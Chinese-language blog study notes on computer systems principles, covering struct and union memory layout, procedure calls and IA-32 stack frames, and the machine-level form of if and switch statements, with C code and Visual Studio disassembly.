<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cont_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">char</span> id[<span class="number">8</span>];</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">12</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> post;</span><br><span class="line">	<span class="keyword">char</span> address[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">char</span> phone[<span class="number">20</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> xpost = x.post;<span class="comment">//movl 20(%edx),%eax偏移量是20</span></span><br></pre></td></tr></table></figure>
<p>结构体数据作为入口参数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stu_phone1</span><span class="params">(struct cont_info *s_info_ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s phone number: %s"</span>, (*s_info_ptr).name, (*s_info_ptr).phone);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stu_phone2</span><span class="params">(struct cont_info s_info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s phone number: %s"</span>, s_info.name, s_info.phone);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结构体变量需要作为一个函数参数时，形参和调用函数中的实参具有相同结构。若采用按值传递，则结构成员都要复制到栈中的参数区，这既增加时间又增加空间，且更新后数据无法在调用中使用。  </p>
<p>(*stu_info_ptr).name可写为stu_info_ptr-&gt;name  </p>
<p><a href="http://wx4.sinaimg.cn/mw690/af2d2659gy1ffpusncsqyj20c30ez76r.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx4.sinaimg.cn/mw690/af2d2659gy1ffpusncsqyj20c30ez76r.jpg" class="img-fluid"><br></a></p>
<p>执行以下两条指令后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl 8(%ebp),%edx</span><br><span class="line">leal 8(%edx),%eax</span><br></pre></td></tr></table></figure>
<p>EAX中存放的是字符串  </p>
<p>stu_info.name送EAX的指令序列为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leal 8(%ebp),%edx</span><br><span class="line">leal 8(%edx),%eax</span><br></pre></td></tr></table></figure>
<p><a href="http://wx3.sinaimg.cn/mw690/af2d2659gy1ffpuso2mx7j20cj0f3dj1.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx3.sinaimg.cn/mw690/af2d2659gy1ffpuso2mx7j20cj0f3dj1.jpg" class="img-fluid"><br></a></p>
<p>很明显第二种做法开销很大</p>
<h2 id="联合体数据的分配和访问"><a href="#联合体数据的分配和访问" class="headerlink" title="联合体数据的分配和访问"></a>联合体数据的分配和访问</h2><p>联合体各成员共享存储空间，按最大长度成员所需空间大小为准</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">union_uarea</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> c_data;</span><br><span class="line">	<span class="keyword">short</span> s_data;</span><br><span class="line">	<span class="keyword">int</span> i_data;</span><br><span class="line">	<span class="keyword">long</span> l_data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在IA-32中占用4个字节。当事先知道某种数据结构中的不同字段的使用时间是互斥的，就可以将这些字段声明为union，以减少空间。  </p>
<p>实现对相同序列的不同数据类型解释  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> </span><br><span class="line">float2unsign(<span class="keyword">float</span> f)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">union</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">float</span> f;</span><br><span class="line">		<span class="keyword">unsigned</span> u;</span><br><span class="line">	&#125;tmp_union;</span><br><span class="line">	tmp_union.f = f;</span><br><span class="line">	<span class="keyword">return</span> tmp_union.u;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过程体为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl 8(%ebp),%eax</span><br><span class="line">movl %eax,-4(%ebp)</span><br><span class="line">movl -4(%ebp),%eax</span><br></pre></td></tr></table></figure>
<p>最后两条指令会被优化掉<br>结果就是float转化为unsigned但是没有使用内部装换所以，float2unsign(10.0)=1092616192  </p>
<p>利用嵌套定义链表结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> node</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">		<span class="keyword">int</span> *pre;</span><br><span class="line">		<span class="keyword">int</span> data1;</span><br><span class="line">	&#125;node1;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">	&#123;</span></span><br><span class="line">		<span class="keyword">int</span> data2;</span><br><span class="line">		<span class="keyword">union</span> node *next;</span><br><span class="line">	&#125;node2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">node_proc</span><span class="params">( <span class="keyword">union</span> node *np)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	np-&gt;node2.next-&gt;node1.data1=*(np-&gt;node2.next-&gt;node1.ptr)+np-&gt;node2.data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://wx1.sinaimg.cn/mw690/af2d2659gy1ffpusoj83aj20ab0fcabs.jpg" data-lightbox="roadtrip" target="_blank" rel="noopener"><br><img src="http://wx1.sinaimg.cn/mw690/af2d2659gy1ffpusoj83aj20ab0fcabs.jpg" class="img-fluid"><br></a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movl 8(%ebp),%ecx</span><br><span class="line">movl 4(%ecx),%edx</span><br><span class="line">movl (%edx),%eax</span><br><span class="line">movl (%eax),%eax</span><br><span class="line">addl (%ecx),%eax</span><br><span class="line">movl %eax,4(%edx)</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/notes/">notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-14-C语言语句的机器级表示"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/14/2017-05-14-C语言语句的机器级表示/">C语言语句的机器级表示</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/14/2017-05-14-C语言语句的机器级表示/" class="article-date">
	  <time datetime="2017-05-13T16:00:00.000Z" itemprop="datePublished">五月 14, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="过程调用的机器级表示"><a href="#过程调用的机器级表示" class="headerlink" title="过程调用的机器级表示"></a>过程调用的机器级表示</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> t1 = <span class="number">125</span>;</span><br><span class="line">	<span class="keyword">int</span> t2 = <span class="number">80</span>;</span><br><span class="line">	<span class="keyword">int</span> sum = add(t1, t2);</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>过程调用执行步骤（P为调用者，Q为被调用者）  </p>
<ol>
<li>P将入口参数放到Q能访问到的地方  </li>
<li>P保存返回地址，然后将控制转移到Q；call指令  </li>
<li>Q保存P的现场，并为自己的非静态局部变量分配空间  </li>
<li>回复Q的过程体；  </li>
<li>Q恢复P的现场，释放局部变量空间；  </li>
<li>Q取出返回地址，将控制转移到P；RET指令  </li>
</ol>
<p>IA-32的寄存器使用约定：调用者P保存寄存器（EAX、EDX、ECX），Q可直接使用这三个寄存器。若P在从Q返回后还要用的话，P应在转到Q之前先保存，并在从Q返回后先恢复它们的值再使用。被调用者Q保存寄存器（EBX、ESI、EDI）。Q必须先将它们的值保存在栈中在使用它们，并在返回P之前恢复它们的值。<br>EBP和ESP分别是帧指针寄存器和栈指针寄存器，分别用来指向当前栈帧的底部和顶部。  </p>
<h2 id="入口参数位置"><a href="#入口参数位置" class="headerlink" title="入口参数位置"></a>入口参数位置</h2><p>movl 参数3,8(%esp)<br>movl 参数2,4(%esp)<br>movl 参数1,(%esp)<br>call add<br>call:<br>R[esp]&lt;-R[esp]-4<br>M[R[esp]] 返回地址（call指令的下一条指令的地址）<br>R[eip] add函数首地址<br>每个过程开始两条指令<br>pushl %ebp<br>movl %esp,%ebp  </p>
<p>例子：应始终返回d[0]中的3.14，但是并非如此  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">double</span> d[<span class="number">1</span>] = &#123;<span class="number">3.14</span>&#125;;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> <span class="keyword">int</span> a[<span class="number">2</span>];</span><br><span class="line">	a[i] = <span class="number">1073741824</span>;</span><br><span class="line">	<span class="keyword">return</span> d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在vs2015执行中出现了报错Run-Time Check Failure #2 - Stack around the variable ‘a’ was corrupted.原因在于如果i超出了范围，数组中的数据会破坏栈里面的数据。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">fun</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="number">01161710</span>  push        ebp  </span><br><span class="line"><span class="number">01161711</span>  mov         ebp,esp  </span><br><span class="line"><span class="number">01161713</span>  sub         esp,<span class="number">0E0</span>h  </span><br><span class="line"><span class="number">01161719</span>  push        ebx  </span><br><span class="line"><span class="number">0116171</span>A  push        esi  </span><br><span class="line"><span class="number">0116171B</span>  push        edi  </span><br><span class="line"><span class="number">0116171</span>C  lea         edi,[ebp<span class="number">-0E0</span>h]  </span><br><span class="line"><span class="number">01161722</span>  mov         ecx,<span class="number">38</span>h  </span><br><span class="line"><span class="number">01161727</span>  mov         eax,<span class="number">0</span>CCCCCCCCh  </span><br><span class="line"><span class="number">0116172</span>C  rep stos    dword ptr es:[edi]  </span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">double</span> d[<span class="number">1</span>] = &#123; <span class="number">3.14</span> &#125;;</span><br><span class="line"><span class="number">0116172</span>E  movsd       xmm0,mmword ptr [__real@<span class="number">40091</span>eb851eb851f (<span class="number">01166B</span>38h)]  </span><br><span class="line"><span class="number">01161736</span>  movsd       mmword ptr [d],xmm0  </span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> <span class="keyword">int</span> a[<span class="number">2</span>];</span><br><span class="line">	a[i] = <span class="number">1073741824</span>;</span><br><span class="line"><span class="number">0116173B</span>  mov         eax,dword ptr [i]  </span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> <span class="keyword">int</span> a[<span class="number">2</span>];</span><br><span class="line">	a[i] = <span class="number">1073741824</span>;<span class="comment">//400000000h</span></span><br><span class="line"><span class="number">0116173</span>E  mov         dword ptr a[eax*<span class="number">4</span>],<span class="number">40000000</span>h  </span><br><span class="line">	<span class="keyword">return</span> d[<span class="number">0</span>];</span><br><span class="line"><span class="number">01161746</span>  mov         eax,<span class="number">8</span>  </span><br><span class="line"><span class="number">0116174B</span>  imul        ecx,eax,<span class="number">0</span>  </span><br><span class="line"><span class="number">0116174</span>E  fld         qword ptr d[ecx]  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="选择和循环结构"><a href="#选择和循环结构" class="headerlink" title="选择和循环结构"></a>选择和循环结构</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(cond_expr)</span><br><span class="line">	then_statement</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	else_statement</span><br></pre></td></tr></table></figure>
<p>机器级表示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	c = cond_expr;</span><br><span class="line">	if(!c)</span><br><span class="line">		goto false_label;</span><br><span class="line">	then_statement</span><br><span class="line">	goto done;</span><br><span class="line">false_label:</span><br><span class="line">	else_statement</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>
<p>例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_cont</span><span class="params">(<span class="keyword">int</span> *p1, <span class="keyword">int</span> *p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="number">00831790</span>  push        ebp  </span><br><span class="line"><span class="number">00831791</span>  mov         ebp,esp  </span><br><span class="line"><span class="number">00831793</span>  sub         esp,<span class="number">0</span>C0h  </span><br><span class="line"><span class="number">00831799</span>  push        ebx  </span><br><span class="line"><span class="number">0083179</span>A  push        esi  </span><br><span class="line"><span class="number">0083179B</span>  push        edi  </span><br><span class="line"><span class="number">0083179</span>C  lea         edi,[ebp<span class="number">-0</span>C0h]  </span><br><span class="line"><span class="number">008317</span>A2  mov         ecx,<span class="number">30</span>h  </span><br><span class="line"><span class="number">008317</span>A7  mov         eax,<span class="number">0</span>CCCCCCCCh  </span><br><span class="line"><span class="number">008317</span>AC  rep stos    dword ptr es:[edi]  </span><br><span class="line">	<span class="keyword">if</span> (p1 &gt; p2)</span><br><span class="line"><span class="number">008317</span>AE  mov         eax,dword ptr [p1]  </span><br><span class="line"><span class="number">008317B</span>1  cmp         eax,dword ptr [p2]  <span class="comment">//比较</span></span><br><span class="line"><span class="number">008317B</span>4  jbe         get_cont+<span class="number">2F</span>h (<span class="number">08317B</span>Fh)  </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> *p2;</span><br><span class="line"><span class="number">008317B</span>6  mov         eax,dword ptr [p2]  </span><br><span class="line"><span class="number">008317B</span>9  mov         eax,dword ptr [eax]  </span><br><span class="line"><span class="number">008317B</span>B  jmp         get_cont+<span class="number">34</span>h (<span class="number">08317</span>C4h)  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line"><span class="number">008317B</span>D  jmp         get_cont+<span class="number">34</span>h (<span class="number">08317</span>C4h)  <span class="comment">//这条指令看上去执行不到啊</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> *p1;</span><br><span class="line"><span class="number">008317B</span>F  mov         eax,dword ptr [p1]  </span><br><span class="line"><span class="number">008317</span>C2  mov         eax,dword ptr [eax]  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">008317</span>C4  pop         edi  </span><br><span class="line"><span class="number">008317</span>C5  pop         esi  </span><br><span class="line"><span class="number">008317</span>C6  pop         ebx  </span><br><span class="line"><span class="number">008317</span>C7  mov         esp,ebp  </span><br><span class="line"><span class="number">008317</span>C9  pop         ebp  </span><br><span class="line"><span class="number">008317</span>CA  ret</span><br></pre></td></tr></table></figure>
<p>关于switch语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sw_test</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="number">00</span>A11810  push        ebp  </span><br><span class="line"><span class="number">00</span>A11811  mov         ebp,esp  </span><br><span class="line"><span class="number">00</span>A11813  sub         esp,<span class="number">0</span>D0h  </span><br><span class="line"><span class="number">00</span>A11819  push        ebx  </span><br><span class="line"><span class="number">00</span>A1181A  push        esi  </span><br><span class="line"><span class="number">00</span>A1181B  push        edi  </span><br><span class="line"><span class="number">00</span>A1181C  lea         edi,[ebp<span class="number">-0</span>D0h]  </span><br><span class="line"><span class="number">00</span>A11822  mov         ecx,<span class="number">34</span>h  </span><br><span class="line"><span class="number">00</span>A11827  mov         eax,<span class="number">0</span>CCCCCCCCh  </span><br><span class="line"><span class="number">00</span>A1182C  rep stos    dword ptr es:[edi]  </span><br><span class="line">	<span class="keyword">int</span> result;</span><br><span class="line">	<span class="keyword">switch</span> (a)</span><br><span class="line"><span class="number">00</span>A1182E  mov         eax,dword ptr [a]  <span class="comment">//参数a</span></span><br><span class="line"><span class="number">00</span>A11831  mov         dword ptr [ebp<span class="number">-0</span>D0h],eax  </span><br><span class="line"><span class="number">00</span>A11837  mov         ecx,dword ptr [ebp<span class="number">-0</span>D0h]  </span><br><span class="line"><span class="number">00</span>A1183D  sub         ecx,<span class="number">0</span>Ah  <span class="comment">//i=i-10</span></span><br><span class="line">	<span class="keyword">int</span> result;</span><br><span class="line">	<span class="keyword">switch</span> (a)</span><br><span class="line"><span class="number">00</span>A11840  mov         dword ptr [ebp<span class="number">-0</span>D0h],ecx  </span><br><span class="line"><span class="number">00</span>A11846  cmp         dword ptr [ebp<span class="number">-0</span>D0h],<span class="number">7</span>  <span class="comment">//i与7比较</span></span><br><span class="line"><span class="number">00</span>A1184D  ja          $LN6+<span class="number">0B</span>h (<span class="number">0</span>A1187Bh)  <span class="comment">//&gt;7则跳转到输出default</span></span><br><span class="line"><span class="number">00</span>A1184F  mov         edx,dword ptr [ebp<span class="number">-0</span>D0h]  <span class="comment">//edx=i</span></span><br><span class="line"><span class="number">00</span>A11855  jmp         dword ptr [edx*<span class="number">4</span>+<span class="number">0</span>A1188Ch]  <span class="comment">//跳到跳转表的位置</span></span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">		c = b &amp; <span class="number">0x0f</span>;</span><br><span class="line"><span class="number">00</span>A1185C  mov         eax,dword ptr [b]  </span><br><span class="line"><span class="number">00</span>A1185F  <span class="keyword">and</span>         eax,<span class="number">0F</span>h  </span><br><span class="line"><span class="number">00</span>A11862  mov         dword ptr [c],eax  </span><br><span class="line">	<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">		result = c + <span class="number">50</span>;</span><br><span class="line"><span class="number">00</span>A11865  mov         eax,dword ptr [c]  </span><br><span class="line"><span class="number">00</span>A11868  add         eax,<span class="number">32</span>h  </span><br><span class="line"><span class="number">00</span>A1186B  mov         dword ptr [result],eax  </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"><span class="number">00</span>A1186E  jmp         $LN6+<span class="number">11</span>h (<span class="number">0</span>A11881h)  </span><br><span class="line">	<span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">		result = b + <span class="number">50</span>;</span><br><span class="line"><span class="number">00</span>A11870  mov         eax,dword ptr [b]  </span><br><span class="line"><span class="number">00</span>A11873  add         eax,<span class="number">32</span>h  </span><br><span class="line"><span class="number">00</span>A11876  mov         dword ptr [result],eax  </span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line"><span class="number">00</span>A11879  jmp         $LN6+<span class="number">11</span>h (<span class="number">0</span>A11881h)  </span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		result = a;</span><br><span class="line"><span class="number">00</span>A1187B  mov         eax,dword ptr [a]  </span><br><span class="line"><span class="number">00</span>A1187E  mov         dword ptr [result],eax  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line"><span class="number">00</span>A11881  mov         eax,dword ptr [result]  </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00</span>A11884  pop         edi  </span><br><span class="line">&#125;</span><br><span class="line"><span class="number">00</span>A11885  pop         esi  </span><br><span class="line"><span class="number">00</span>A11886  pop         ebx  </span><br><span class="line"><span class="number">00</span>A11887  mov         esp,ebp  </span><br><span class="line"><span class="number">00</span>A11889  pop         ebp  </span><br><span class="line"><span class="number">00</span>A1188A  ret  </span><br><span class="line"><span class="number">00</span>A1188B  nop  </span><br><span class="line"><span class="number">00</span>A1188C  sbb         byte ptr gs:[ecx<span class="number">-5</span>EE78500h],ah  </span><br><span class="line"><span class="number">00</span>A11893  add         byte ptr [eax+<span class="number">18</span>h],dh  </span><br><span class="line"><span class="number">00</span>A11896  mov         eax,dword ptr ds:[A1187B00h]  </span><br><span class="line"><span class="number">00</span>A1189B  add         byte ptr [ebx+<span class="number">18</span>h],bh  </span><br><span class="line"><span class="number">00</span>A1189E  mov         eax,dword ptr ds:[A1185C00h]  </span><br><span class="line"><span class="number">00</span>A118A3  add         byte ptr [ebx+<span class="number">18</span>h],bh  </span><br><span class="line"><span class="number">00</span>A118A6  mov         eax,dword ptr ds:[A1187000h]  </span><br><span class="line"><span class="number">00</span>A118AB  add         ah,cl</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/notes/">notes</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原理/">原理</a></li></ul>

      
    </footer>
    <hr class="entry-footer-hr">
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-2017-05-13-IA-32指令类型2"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/2017/05/13/2017-05-13-IA-32指令类型2/">IA-32指令类型（2）</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2017/05/13/2017-05-13-IA-32指令类型2/" class="article-date">
	  <time datetime="2017-05-12T16:00:00.000Z" itemprop="datePublished">五月 13, 2017</time>
	</a>

      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/计算机系统原理/">计算机系统原理</a>
 
      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="控制转移指令"><a href="#控制转移指令" class="headerlink" title="控制转移指令"></a>控制转移指令</h1><p>指令执行可按顺序或跳转到转移目标指令处执行<br>无条件转移指令<br>JMP DST：无条件转移到目标指令DST处执行<br>条件转移指令<br>Jcc DST：cc为条件码，根据标志判断是否满足条件，若条件满足，则转移到目标指令DST处执行，否则按顺序执行<br>条件设置<br>SET cc DST ：按条件码cc判断的结果保存到 DST（8位寄存器）<br>调用和返回指令<br>CALL DST：返回地址RA入栈，转DST处执行<br>RET：从栈中取出返回地址RA，转到RA<br>中断指令</p>
